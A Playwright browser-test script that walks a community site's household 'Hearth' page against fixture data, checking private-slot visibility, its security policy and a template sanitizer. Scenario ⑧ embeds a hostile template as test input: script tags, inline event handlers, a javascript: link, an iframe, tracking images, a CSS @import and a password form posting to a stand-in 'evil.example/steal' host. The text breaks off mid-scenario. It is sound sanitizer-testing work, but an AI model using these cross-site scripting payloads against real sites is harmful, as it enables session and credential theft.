// hearth-walk.mjs — the Hearth, walked in a real browser against synthetic data (POS-959).
//
//   node qa-shots/hearth-walk.mjs            (astro dev already serving on :4399; see below)
//
// WHAT THIS IS FOR. Every ruling on this page is about a thing landing on a screen: a template drawn
// from sanitized markup, slots filled from reads, a private part that must not show, a behavior that must
// answer a real pointer, and an adversarial template that must do nothing. None of that is reachable from a
// unit test, so this drives real chromium with real pointer events and READS what is on the page.
//
// NO LIVE OFFICE IS TOUCHED. Every request to postmark.town (and every /api call on the dev server, which
// astro.config.town.mjs would otherwise proxy to the live office) is intercepted by page.route and answered
// from qa-shots/hearth-fixtures.mjs: invented residents, invented letters. A request that reaches the network
// unanswered is recorded and fails the walk. No private data and no credential is used: the "signed-in"
// token is the literal string "fx-owner-token", which only these fixtures honour.
//
// The houses are two real PUBLIC households from the site's baked registry (their names and members are
// already on the public Households page); everything LIVE about them is the fixtures'.
//
//   npm run build && npx astro preview --config astro.config.town.mjs --port 4399 --host 127.0.0.1 &
//   node qa-shots/hearth-walk.mjs
//
// IT RUNS AGAINST THE BUILT SITE (astro preview), not `astro dev`: the Hearth page's security policy is written into
// the built html (town/scripts/hearth-csp.mjs), so only a build has it. Every scenario also listens for
// `securitypolicyviolation`: the host's own scripts and controls must run clean under the policy, and scenario ⑩ proves
// the policy itself stops an injected inline handler and an injected inline script (the layer beneath the sanitizer).
//
// Playwright is resolved from the PLAYWRIGHT env, else the world checkout's (installed, not installed here).
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import * as fx from "./hearth-fixtures.mjs";
import { prepareEntry } from "../src/lib/hearth/entries.mjs";

const PW = process.env.PLAYWRIGHT ?? "/home/seat/trees-world/wld-27-world/node_modules/playwright";
const { chromium } = createRequire(import.meta.url)(PW);
const BASE = process.env.BASE ?? "http://127.0.0.1:4399";
const ROOT = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
// POS-984 (rebuilt 2026-11-10): the walk covers the ONE household page (/households/<slug>/), owner and visitor: the Hearth under the shell with one thin strip
// (the household's sub-rail with its reading mark and the owner's +, and in its corner the dropdown and the owner's settings, POS-999) and no band; the screenshots land beside it by default
const OUT = process.env.OUT ?? path.join(os.tmpdir(), "pos984-walk");   // never inside a pool tree
fs.mkdirSync(OUT, { recursive: true });
const households = JSON.parse(fs.readFileSync(path.join(ROOT, "src/data/postmark/households.json"), "utf8")).households;
const A_SLUG = "dreme-mynd", B_SLUG = "fox-hearth";
const A = households[A_SLUG].residents, B = households[B_SLUG].residents;
const OWNER_TOKEN = "fx-owner-token";

const results = [];
const record = (name, pass, detail = "") => { results.push({ name, pass, detail }); console.log(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? "  —  " + detail : ""}`); };
const check = (name, cond, detail) => record(name, !!cond, detail === undefined ? "" : String(detail));

// ── the fixture office ──────────────────────────────────────────────────────
const log = [];            // every call the page made to the office: { path, auth, status }
const unanswered = [];     // requests that left the machine unanswered
let fail = new Set();      // path prefixes the fixture office answers 500 to, for the "missing data" scenario

// the walk's open ballot: what each choice holds, and whether the office lists a staking ballot at all
let tally = { "the-ledger": 11, "starter-kit": 3 };
let ballotOpen = true;
// the house A's SAVED Hearth (POS-962): what the office keeps, read signed out, written by the owner's confirmed save
let savedHearth = null;
function answer(url, headers, method = "GET", postData = null) {
  const u = new URL(url);
  const p = u.pathname.replace(/^\/api(?=\/)/, "");
  const auth = headers.authorization ?? null;
  const asHandles = (h) => (households[A_SLUG].residents.includes(h) ? A : B);
  let m;
  if ([...fail].some((f) => p.startsWith(f) || (u.pathname + u.search).includes(f))) return { status: 500, body: { error: "fixture: this door is down" } };
  if ((m = /^\/doorstep\/([^/]+)$/.exec(p))) {
    const h = decodeURIComponent(m[1]);
    const idx = asHandles(h).indexOf(h);
    return { status: 200, body: fx.doorstep(h, { owner: auth === `Bearer ${OWNER_TOKEN}` && A.includes(h), n: idx }) };
  }
  if ((m = /^\/mail\/([^/]+)$/.exec(p))) return { status: 200, body: fx.outbox(decodeURIComponent(m[1])) };
  if (/^\/quests\//.test(p)) return { status: 200, body: fx.quests() };
  if (p === "/world/walkers") return { status: 200, body: fx.walkers([...A, ...B]) };
  if (p === "/world/conversations") return { status: 200, body: fx.conversations(A) };
  if (p === "/calendar") return { status: 200, body: fx.calendar(A[0]) };
  if (p === "/posts") return { status: 200, body: fx.posts(u.searchParams.get("class"), A) };
  // GET /me, as the office answers it: the handles, and the household block per handle (postmark-office src/households.mjs householdLookupOf)
  if (p === "/households" && method === "GET") return { status: 200, body: { registry: { households: { [A_SLUG]: { hearth: savedHearth } } } } };
  if (p === `/households/${A_SLUG}/hearth` && method === "PATCH") {
    if (auth !== `Bearer ${OWNER_TOKEN}`) return { status: 403, body: { error: "bounce", code: 403, defect: "not this household's human" } };
    savedHearth = JSON.parse(postData ?? "{}").hearth ?? null;
    return { status: 200, body: { hearth: savedHearth } };
  }
  if (p === "/votes") return { status: 200, body: fx.votes(tally, { open: ballotOpen }) };
  if (p.startsWith("/votes/")) return { status: 200, body: fx.votesStanding(tally, 20 - (tally["the-ledger"] ?? 0) % 20) };
  if (p === "/household" && method === "POST") {
    const b = JSON.parse(postData ?? "{}"); const args = b.args ?? {};
    if (auth !== `Bearer ${OWNER_TOKEN}` || !A.includes(args.from)) return { status: 403, body: { error: "bounce", code: 403, defect: "not your resident" } };
    const r = fx.stakeResult(args, tally);
    if (!args.preview) tally = { ...tally, [args.candidate]: (tally[args.candidate] ?? 0) + Number(args.stamps) };
    return { status: 200, body: r };
  }
  if (p === "/me") return auth === `Bearer ${OWNER_TOKEN}` ? { status: 200, body: { handles: A, households: Object.fromEntries(A.map((h) => [h, { key: A_SLUG, slug: A_SLUG, residents: [...A].sort() }])) } } : { status: 401, body: {} };
  return { status: 404, body: { error: "fixture: no such door " + p } };
}

// the saved choice a BUILD would have baked into the page (data-hearth-baked), for the baked-start scenario: the document is rewritten to carry it
let injectBaked = null;
let householdsDelay = 0;   // ms the office takes to answer GET /households (the saved-choice read)
// POS-984: office paths held shut until the walk lets them go (a slow doorstep, with no clock in it), and every office path as it ARRIVED (before any hold)
const holds = new Map();
const requested = [];
let injectEntry = null;   // a prepared entry added to the page's registered list, for the hostile-template scenario

// `pendingMe`: a first sign-in. The token is there and the tab has not been told its handles; GET /me answers after that many ms.
async function newPage(browser, { signedIn = false, pendingMe = 0, viewport = { width: 1280, height: 900 } } = {}) {
  const ctx = await browser.newContext({ viewport });
  await ctx.addInitScript(() => {
    window.__cspv = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__cspv.push(`${e.violatedDirective} ${String(e.blockedURI).slice(0, 60)}`));
  });
  if (signedIn) {
    await ctx.addInitScript(([tok, handles, first]) => {
      // init scripts run in EVERY frame, and the household page now carries the residents' sandboxed window frames (POS-984),
      // whose opaque origin refuses storage: the sign-in is the top page's
      if (window.top !== window) return;
      localStorage.setItem("pm.oauth.token", JSON.stringify({ access_token: tok, obtained: Date.now(), expires_in: 3600 }));
      // a first sign-in has not been told its handles yet: /me answers later and the layout stores them then
      if (!first) sessionStorage.setItem("pm.oauth.handles", JSON.stringify(handles));
    }, [OWNER_TOKEN, A, pendingMe > 0]);
  }
  await ctx.route("**/*", async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const local = url.hostname === "127.0.0.1" || url.hostname === "localhost";
    const office = url.hostname === "postmark.town" || (local && url.pathname.startsWith("/api/"));
    if (office) {
      const asked = url.pathname.replace(/^\/api(?=\/)/, "");
      requested.push(asked + url.search);
      if (holds.has(asked)) await holds.get(asked).promise;
      if (pendingMe > 0&& url.pathname.replace(/^\/api(?=\/)/, "") === "/me") await new Promise((r) => setTimeout(r, pendingMe));
      if (householdsDelay > 0 && url.pathname.replace(/^\/api(?=\/)/, "") === "/households" && req.method() === "GET") await new Promise((r) => setTimeout(r, householdsDelay));
      const a = answer(req.url(), req.headers(), req.method(), req.postData());
      log.push({ path: url.pathname.replace(/^\/api(?=\/)/, "") + url.search, auth: req.headers().authorization ?? null, status: a.status });
      return route.fulfill({ status: a.status, contentType: "application/json", body: JSON.stringify(a.body), headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*" } });
    }
    if (local && (injectEntry || injectBaked) && req.resourceType() === "document" && /^\/households\/[^/]+\/$/.test(url.pathname)) {
      const res = await route.fetch();
      let body = await res.text();
      if (injectBaked) body = body.replace(/data-hearth-baked(?=[\s>])/, `data-hearth-baked="${injectBaked}"`);   // Astro prints the empty value as the bare attribute
      if (!injectEntry) return route.fulfill({ response: res, body });
      body = body.replace(/(<script type="application\/json" data-hearth-entries[^>]*>)([\s\S]*?)(<\/script>)/, (m, a, json, z) => {
        const list = JSON.parse(json.replace(/\\u003c/g, "<"));
        list.push({ id: injectEntry.id, title: injectEntry.title, author: injectEntry.author, line: injectEntry.line, css: injectEntry.css, html: injectEntry.html });
        return a + JSON.stringify(list).split("<").join("\\u003c") + z;
      });
      return route.fulfill({ response: res, body });
    }
    if (local) return route.continue();
    unanswered.push(req.url());
    return route.abort();
  });
  const page = await ctx.newPage();
  page.on("pageerror", (e) => record("no page error", false, String(e).slice(0, 200)));
  return page;
}

const cleanUnderPolicy = async (page, label) => check(`${label}: the host runs clean under the page's security policy (no violation)`, (await page.evaluate(() => window.__cspv ?? [])).length === 0, JSON.stringify(await page.evaluate(() => window.__cspv ?? [])));
const shot = (page, name, opts = {}) => page.screenshot({ path: path.join(OUT, name + ".png"), ...opts });
const ready = async (page) => {
  await page.waitForSelector("[data-hearth-stage]");
  await page.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing, null, { timeout: 15000 });
  await page.waitForSelector("[data-hd-feed] .hd-line", { timeout: 15000 }).catch(() => {});
};
const text = (page, sel) => page.locator(sel).first().textContent().catch(() => null);
const visible = (page, sel) => page.locator(sel).first().isVisible().catch(() => false);

const SLOT_COUNT = 13;
const run = async () => {
  const browser = await chromium.launch();
  process.on("uncaughtException", async (e) => { console.error(e); await browser.close(); process.exit(1); });
  try {
    // ── ⑫ A DESIGN CANNOT PAINT OVER THE STRIP (POS-984, Truey's review of ba023e9d9; the strip is what the band was) ──
    // A `:root`, `html` or `body` rule is rewritten onto the design's own stage, where `margin` and `transform` are allowed and no
    // `!important` is needed, and the stage's `contain: paint` clips its children, not itself. The hostile rules below carry NO
    // `!important` on purpose (the `!important` ones are refused by the sanitizer, so a test written with them cannot see this).
    // The host's frame (`.hearth-frame { contain: paint }`) is what keeps the strip on top; WALK_ONLY=rooted runs just this.
    {
      const pointAt = (page) => page.evaluate(() => {
        const out = {};
        // POS-999: the + is a round pill on the sub-rail, and the likeness answer is in the settings panel, so the settings button is what stands in the strip
        for (const [name, sel] of [["the breadcrumb", "[data-hearth-bar] .hearth-crumbs a"], ["the Hearth dropdown", "[data-hearth-bar] [data-hearth-pick]"], ["the +", "[data-hearth-bar] [data-house-add]"], ["the settings", "[data-hearth-bar] .hearth-gear"]]) {
          const e = document.querySelector(sel);
          if (!e) { out[name] = "absent"; continue; }
          e.scrollIntoView({ block: "center", behavior: "instant" });
          const r = e.getBoundingClientRect();
          const top = document.elementFromPoint(r.left + Math.min(20, r.width / 2), r.top + r.height / 2);
          out[name] = top && document.querySelector("[data-hearth-bar]").contains(top) ? "strip" : top?.closest("[data-hearth-stage]") ? "stage" : String(top?.tagName);
        }
        return out;
      });
      const asBand = (o) => Object.values(o).every((v) => v === "strip");
      const rules = [
        ["control, no rule", "rooted-none", ".u-nothing { color: red }"],
        ["a margin pulling the design up, and a background to paint with", "rooted-margin", ":root { margin-top: -900px; background: #0b0f1c; }"],
        ["a transform lifting the design", "rooted-transform", "html { transform: translateY(-900px); background: #0b0f1c; }"],
        ["body, the same trick", "rooted-body", "body { margin-top: -900px; background: #0b0f1c; position: relative; top: -50px; }"],
        // INK, not boxes (review, advisory): an outline paints outside the stage's box, over whatever is near, and elementFromPoint cannot see it,
        // so this case is judged by PIXELS: the band, photographed, is byte for byte what it is under the control design
        ["an outline of 900px of magenta round the design (ink that elementFromPoint cannot see)", "rooted-outline", ":root { outline: 900px solid #ff00ff; }"],
        ["a box-shadow of 900px of magenta round the design", "rooted-shadow", ":root { box-shadow: 0 0 0 900px #ff00ff; }"],
      ];
      let controlPixels = null;
      for (const [what, id, css] of rules) {
        const e = prepareEntry({ id, title: id, author: "nobody", line: "A rooted rule.", html: "<hearth-house></hearth-house><hearth-residents></hearth-residents>", css });
        const kept = id === "rooted-none" || /margin-top\s*:\s*-900px|translateY\(-900px\)|outline:900px|box-shadow:0 0 0 900px/.test(e.css);
        check(`⑫ ${what}: the sanitizer lets the rule through (so this test can see the failure)`, e.ok && kept && !e.problems.some((p) => /margin|transform|top/.test(p)), e.css.slice(0, 160) + " " + JSON.stringify(e.problems));
        injectEntry = e;
        const page = await newPage(browser, { signedIn: true });
        await page.goto(`${BASE}/households/${A_SLUG}/?entry=${id}`, { waitUntil: "load" });
        await ready(page);
        await page.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });   // the owner's settings are shown: the strip is whole
        await page.waitForFunction(() => document.querySelector("[data-hd-reading-mark]")?.hidden === true, null, { timeout: 15000 });   // and the reading mark has gone, so the strip photographs the same twice
        check(`⑫ ${what}: the design drawn is the hostile one`, (await page.locator("[data-hearth-stage]").getAttribute("data-hearth-entry")) === id);
        const moved = await page.evaluate(() => { const s = document.querySelector("[data-hearth-stage]").getBoundingClientRect().top; const f = (document.querySelector(".hearth-frame") ?? document.querySelector("[data-hearth-stage]")).getBoundingClientRect().top; return Math.round(f - s); });
        const ink = await page.evaluate(() => { const c = getComputedStyle(document.querySelector("[data-hearth-stage]")); return { outline: c.outlineWidth + " " + c.outlineStyle, shadow: c.boxShadow }; });
        if (/outline|shadow/.test(id)) check(`⑫ ${what}: the rule took effect on the design's own box (${JSON.stringify(ink)})`, /900px/.test(id === "rooted-outline" ? ink.outline : ink.shadow), JSON.stringify(ink));
        else if (id !== "rooted-none") check(`⑫ ${what}: the rule took effect: the design's own box sits ${moved}px above where it was put`, moved > 300, moved);
        const at = await pointAt(page);
        check(`⑫ ${what}: the strip's controls are still the top thing at their own points (the breadcrumb, the dropdown, the +, the settings)`, asBand(at), JSON.stringify(at));
        // the pixels of the strip itself: the control's, twice (the probe is stable), then every hostile design's must equal it. The strip is photographed at the top of the page,
        // so a design that makes the page longer or shorter cannot move it by a sub-pixel (pointAt scrolled it to the middle of the screen, where the design's height decides its offset)
        await page.evaluate(() => window.scrollTo({ top: 0, behavior: "instant" }));
        await page.mouse.move(0, 0);
        // The parts photographed are the strip's own parts that do not name the design on show, and whose place does not move with it: the breadcrumb, and the owner's
        // round + on the sub-rail (POS-999). (The dropdown's width and the "Previewing <id>" line legitimately differ per design: they say which design is drawn. The dropdown
        // and the settings button share that row, so the settings button's place moves by a sub-pixel with them, and a picture of it differs at its edge by 1 level in 255
        // with no design's ink in it (measured 2026-11-11 under the magenta outline); both are held by pointAt above, at their own points.)
        const shoot = async () => ({
          crumbs: await page.locator("[data-hearth-bar] .hearth-crumbs").screenshot({ animations: "disabled", caret: "initial" }),
          own: await page.locator("[data-hearth-bar] [data-house-add]").screenshot({ animations: "disabled", caret: "initial" }),
        });
        const pixels = await shoot();
        fs.writeFileSync(path.join(OUT, `16-strip-${id}-own.png`), pixels.own);
        if (id === "rooted-none") {
          controlPixels = pixels;
          const again = await shoot();
          check("⑫ the pixel probe is stable: the control's breadcrumb and the owner's + photographed twice are the same pictures", pixels.crumbs.equals(again.crumbs) && pixels.own.equals(again.own), `${pixels.crumbs.length} + ${pixels.own.length} bytes`);
        } else check(`⑫ ${what}: the strip's breadcrumb and the owner's + are pixel for pixel the control's (no ink of the design's reached them)`, !!controlPixels && pixels.crumbs.equals(controlPixels.crumbs) && pixels.own.equals(controlPixels.own), `${pixels.crumbs.length}+${pixels.own.length} bytes vs ${controlPixels?.crumbs.length}+${controlPixels?.own.length}`);
        await shot(page, `16-rooted-${id}-desktop`, { fullPage: false });
        await page.context().close();
        injectEntry = null;
      }
      if (process.env.WALK_ONLY === "rooted") {
        await browser.close();
        const bad = results.filter((r) => !r.pass);
        console.log(`\n${results.length - bad.length}/${results.length} checks passed (WALK_ONLY=rooted)`);
        process.exit(bad.length ? 1 : 0);
      }
    }

    // ── ① the default Hearth, a public reader, house A ─────────────────────────
    {
      log.length = 0;
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
      check("① the Hearth page carries its security policy: scripts are self and hashes only", !!policy && /script-src 'self' 'sha256-/.test(policy) && !/script-src[^;]*unsafe-inline/.test(policy), policy?.slice(0, 120));
      check("① opens on Postmark's default", (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default");
      check("① the house slot names the house", /dreme|mynd/i.test((await text(page, "[data-hearth-slot=house]")) ?? ""), await text(page, "[data-hearth-slot=house]"));
      check("① a card for every resident", (await page.locator("[data-hearth-slot=residents] [data-hd-card]").count()) === A.length, await page.locator("[data-hearth-slot=residents] [data-hd-card]").count());
      check("① the feed is painted from the fixture reads, not frozen", (await page.locator("[data-hd-feed] .hd-line").count()) > 0);
      check("① the page teaches the holo expansion once, below the stage, shown because the house holds holo", (await page.locator("[data-hearth-holo]").count()) === 1 && (await visible(page, "[data-hearth-holo]")) && ((await page.content()).match(/short for holographic stamp/g) ?? []).length === 1);
      check("① stamps are the doorsteps' sum", /\d/.test((await text(page, "[data-hd-n-held]")) ?? ""), await text(page, "[data-hd-n-held]"));
      check("① posts: only the house's own", (await page.locator("[data-hx-posts] li").count()) === 2 && !(await text(page, "[data-hx-posts]"))?.includes("not this house"), await text(page, "[data-hx-posts]"));
      check("① closest correspondents slot is drawn (public record; its tab is not the open one)", (await page.locator("[data-hearth-slot=closer] .hx-list li, [data-hearth-slot=closer] .hd-empty").count()) >= 1);
      check("① the countdown is live and ticking", await (async () => {
        const a = await text(page, '[data-hx-left="crossing"]'); await page.waitForTimeout(2100); const b = await text(page, '[data-hx-left="crossing"]');
        return a && b && a !== b ? true : `${a} → ${b}`;
      })());
      check("① a public reader sees NO private slot", !(await visible(page, "[data-hearth-slot=needs-you]")) && !(await visible(page, "[data-hearth-slot=mail]")));
      check("① no bearer went to any doorstep for a public reader", log.every((l) => l.auth === null), JSON.stringify(log.filter((l) => l.auth)));
      await shot(page, "01-default-public-desktop", { fullPage: true });
      // tabs, with a real pointer and then the keyboard
      check("① tabs: the first panel shows, the others hide", (await page.locator('.hx-tab[aria-selected="true"]').innerText()) === "Posts" && (await page.locator('[role=tabpanel]:not([hidden])').count()) === 1);
      await page.getByRole("tab", { name: "Marks" }).click();
      check("① tabs: a real click shows Marks", (await visible(page, "[data-hx-marks]")) && !(await visible(page, "[data-hx-posts]")));
      await page.getByRole("tab", { name: "Marks" }).press("ArrowRight");
      check("① tabs: ArrowRight moves on to the next tab", (await page.locator('.hx-tab[aria-selected="true"]').innerText()) === "Closest correspondents");
      await shot(page, "02-default-tabs-desktop");
      await cleanUnderPolicy(page, "①");
      // member links still work
      const first = A[0];
      await page.locator(`[data-hearth-slot=residents] [data-hd-card="${first}"] .hd-card-name`).click();
      await page.waitForLoadState("load");
      check("① a resident's card opens that resident's own page (the household page draws each resident once and carries no tab of theirs)", new URL(page.url()).pathname === `/residents/${first}/`, page.url());
      await page.context().close();
    }

    // ── ② preview any entry: ledger on house A, by the dropdown (in the strip; here as the signed-in human) and by the URL ───
    {
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.waitForFunction(() => document.querySelector("[data-hearth-pick]")?.disabled === false, null, { timeout: 15000 });   // the dropdown is bound once the choice read has answered
      await page.selectOption("[data-hearth-pick]", "ledger");
      await page.waitForFunction(() => document.querySelector("[data-hearth-stage]")?.dataset.hearthEntry === "ledger");
      check("② the picker previews the second entry without a reload", (await page.locator("[data-hearth-stage]").getAttribute("data-hearth-entry")) === "ledger");
      check("② and keeps the preview in the address, only", new URL(page.url()).searchParams.get("entry") === "ledger", page.url());
      await page.waitForSelector("[data-hx-chart] .hx-bar-row", { state: "attached", timeout: 10000 });
      check("② the stamps chart draws a bar per resident", (await page.locator("[data-hx-chart] .hx-bar-row").count()) === A.length);
      await page.waitForSelector("[data-hx-map] .hx-place", { state: "attached", timeout: 10000 });
      check("② the residents map groups residents by place", (await page.locator("[data-hx-map] .hx-place").count()) >= 1, await text(page, "[data-hx-map]"));
      check("② accordion: first panel open, others closed", (await page.locator('.hx-acc-head[aria-expanded="true"]').count()) === 1);
      await page.getByRole("button", { name: "Around town" }).click();
      check("② accordion: a real click opens Around town", (await page.getByRole("button", { name: "Around town" }).getAttribute("aria-expanded")) === "true" && (await visible(page, "[data-hx-town-events] li")));
      check("② around-town events come from the calendar fixture", /synthetic/i.test((await text(page, "[data-hx-town-events]")) ?? ""), await text(page, "[data-hx-town-events]"));
      await shot(page, "03-ledger-preview-desktop", { fullPage: true });
      // a reload on ?entry= opens that entry straight away
      await page.reload({ waitUntil: "load" });
      await ready(page);
      check("② ?entry=ledger opens the ledger on load", (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "ledger");
      await page.selectOption("[data-hearth-pick]", "default");
      await page.waitForFunction(() => document.querySelector("[data-hearth-stage]")?.dataset.hearthEntry === "default");
      check("② back to the default clears the address", !new URL(page.url()).searchParams.has("entry"), page.url());
      await cleanUnderPolicy(page, "②");
      await page.context().close();
    }

    // ── ③ an unknown entry, an unknown household ───────────────────────────────
    {
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${B_SLUG}/?entry=no-such-entry`, { waitUntil: "load" });
      await ready(page);
      check("③ an unknown entry says so and shows the default", /No Hearth entry is registered as/.test((await text(page, "[data-hearth-note]")) ?? "") && (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default", await text(page, "[data-hearth-note]"));
      const r = await page.goto(`${BASE}/households/no-such-household/`, { waitUntil: "load" });
      check("③ an undeclared household has no page: 404", r?.status() === 404, r?.status());
      const r1 = await page.goto(`${BASE}/households/no-such-household/hearth/`, { waitUntil: "load" });
      check("③ and no old Hearth address either: 404", r1?.status() === 404, r1?.status());
      const r2 = await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      check("③ the household's one page is the Hearth: 200, a design on its stage, and no link to a second page", r2?.status() === 200 && (await page.locator("[data-hearth-stage]").count()) === 1 && (await page.locator(`a[href$="/hearth/"]`).count()) === 0);
      await page.context().close();
    }

    // ── ④ the house's own sign-in sees the private slots; another house's page does not ──
    {
      log.length = 0;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      // POS-984 (rebuilt): Needs you is the DESIGN's own slot, shown to the house's own sign-in only (there is no band, and no second copy of it)
      await page.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
      check("④ the owner sees the design's own Needs you, from the fixture's stances", /awaiting the house/.test((await text(page, "[data-hearth-slot=needs-you]")) ?? "") && (await visible(page, "[data-hearth-slot=needs-you]")), await text(page, "[data-hearth-slot=needs-you]"));
      check("④ and only once: one Needs you on the page, the design's", (await page.locator("[data-hd-needs-box]:visible").count()) === 1);
      await page.waitForSelector("[data-hearth-slot=mail]:not([hidden])", { state: "attached", timeout: 15000 });
      check("④ the design's private mail summary is painted from the owner's reads and shown, and so is the waiting-mail (boat) line in what happened", /waiting for the crossing/.test((await text(page, "[data-hearth-slot=mail]")) ?? "") && (await visible(page, "[data-hearth-slot=mail]")) && (await visible(page, "[data-hd-boat]")), `${await text(page, "[data-hearth-slot=mail]")} | ${await text(page, "[data-hd-boat]")}`);
      check("④ the bearer went only to the house's own doorsteps", log.filter((l) => l.auth).every((l) => A.some((h) => l.path.startsWith(`/doorstep/${h}`)) || l.path === "/me"), JSON.stringify(log.filter((l) => l.auth).map((l) => l.path)));
      await shot(page, "04-default-owner-desktop", { fullPage: true });
      await cleanUnderPolicy(page, "④ (signed in)");
      log.length = 0;
      await page.goto(`${BASE}/households/${B_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.waitForTimeout(800);
      check("④ the same sign-in on ANOTHER house's Hearth shows no private slot", !(await visible(page, "[data-hearth-slot=needs-you]")) && !(await visible(page, "[data-hearth-slot=mail]")));
      check("④ and sends no bearer to that house's doorsteps", log.filter((l) => l.path.startsWith("/doorstep/")).every((l) => l.auth === null), JSON.stringify(log.filter((l) => l.auth && l.path.startsWith("/doorstep/"))));
      check("④ the other house's page carries none of the owner's private words", !(await page.content()).includes("waiting for the crossing"));
      // POS-984 (review, paper cut): a signed-in reader of ANOTHER house is told so, plainly, not asked a bare question
      await page.waitForSelector("[data-hx-notyours]:not([hidden])", { timeout: 15000 });
      check("④ and says plainly that this is not their house (in the design's house slot), with no sign-in button and no bare question", (await visible(page, "[data-hx-notyours]")) && /isn’t your house/.test((await text(page, "[data-hx-notyours]")) ?? "") && !(await visible(page, "[data-hd-signin]")), await text(page, "[data-hearth-slot=house] .hx-public"));
      check("④ and the strip shows that reader no owner link: no + add a resident, no likeness answer, no save controls", !(await visible(page, "[data-hearth-bar] [data-house-add]")) && !(await visible(page, "[data-hearth-bar] .hearth-likeness")) && !(await visible(page, "[data-hearth-owner]")));
      await page.context().close();
    }

    // ── ⑤ a door that is down is said, never drawn as zero ──────────────────────
    {
      fail = new Set(["/world/walkers", "/posts", "/calendar"]);
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=ledger`, { waitUntil: "load" });
      await ready(page);
      await page.waitForSelector("[data-hx-map] .hd-empty", { state: "attached", timeout: 10000 });
      check("⑤ the map says the roll could not be read", /could not be read/.test((await text(page, "[data-hx-map]")) ?? ""), await text(page, "[data-hx-map]"));
      check("⑤ posts say they could not be read, not 'no posts'", /could not be read/.test((await text(page, "[data-hx-posts]")) ?? "") && !/has no ideas or bugs/.test((await text(page, "[data-hx-posts]")) ?? ""), await text(page, "[data-hx-posts]"));
      check("⑤ the calendar says it could not be read", /could not be read/.test((await text(page, "[data-hx-town-events]")) ?? ""), await text(page, "[data-hx-town-events]"));
      await shot(page, "05-doors-down-desktop", { fullPage: true });
      await page.context().close();
      fail = new Set();
    }

    // ── ⑥ the phone ─────────────────────────────────────────────────────────────
    {
      const page = await newPage(browser, { viewport: { width: 390, height: 800 } });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
      check("⑥ no sideways scroll at 390px", overflow <= 1, overflow);
      await shot(page, "06-default-phone", { fullPage: true });
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=ledger`, { waitUntil: "load" });
      await ready(page);
      check("⑥ the ledger at 390px: no sideways scroll", (await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(page, "07-ledger-phone", { fullPage: true });
      await page.context().close();
    }

    // ── ⑧ a hostile template, sanitized by the build, drawn by the real page: it does nothing ──
    {
      const hostile = prepareEntry({
        id: "hostile", title: "A hostile template", author: "nobody", line: "Every trick at once.",
        html: `<div class="cover"><script>window.__pwned = "script"</script><img src=x onerror="window.__pwned='onerror'"><svg onload="window.__pwned='svg'"></svg>` +
          `<a href="javascript:window.__pwned='href'" id="evil-link">click me</a><iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/steal"><input name="pw" type="password"></form>` +
          `<img src="https://evil.example/track.gif"><hearth-residents><script>window.__pwned='slot'</script></hearth-residents><hearth-needs-you></hearth-needs-you><hearth-mail></hearth-mail>` +
          `<p onclick="window.__pwned='click'" style="position:fixed;top:0;left:0;width:100vw;height:100vh">cover the page</p></div>`,
        css: `@import url("https://evil.example/x.css"); .cover { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: red; z-index: 99999 } nav, .hearth-bar, h1, header, .hx-name { display: none } p { background: url(https://evil.example/bg.gif); position: fixed }`,
      });
      check("⑧ the build sanitizer lets the hostile entry through only as safe markup", hostile.ok && !/script|onerror|onload|javascript:|iframe|form|evil\.example/i.test(hostile.html) && !/fixed|url|import/i.test(hostile.css), hostile.html.slice(0, 200));
      injectEntry = hostile;
      const before = unanswered.length;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=hostile`, { waitUntil: "load" });
      await ready(page);
      await page.waitForTimeout(1500);
      const state = await page.evaluate(() => {
        const stage = document.querySelector("[data-hearth-stage]");
        const attrs = [...stage.querySelectorAll("*")].flatMap((e) => [...e.attributes].map((a) => a.name));
        // POS-984 (rebuilt): the site's chrome to protect is the strip's dropdown, and the nav
        const bar = document.querySelector("[data-hearth-bar] [data-hearth-pick]");
        // the strip can start off-screen on a phone: elementFromPoint answers null off-screen
        bar.scrollIntoView({ block: "center", behavior: "instant" });   // the site's CSS smooth-scrolls otherwise, and the rect below would be read mid-flight
        const r = bar.getBoundingClientRect();
        const top = document.elementFromPoint(r.left + 40, r.top + r.height / 2);
        return {
          pwned: window.__pwned ?? null, entry: stage.dataset.hearthEntry,
          banned: stage.querySelectorAll("script, iframe, object, embed, form, input, style, link, svg").length,
          handlers: attrs.filter((n) => /^on/.test(n)), styleAttr: attrs.includes("style") && [...stage.querySelectorAll("[style]")].filter((e) => !e.closest("[data-hd-card], .hx-bar, .hd-who, .hd-line")).length,
          links: [...stage.querySelectorAll("a")].map((a) => a.getAttribute("href") ?? "").filter((h) => /^javascript:/i.test(h)).length,
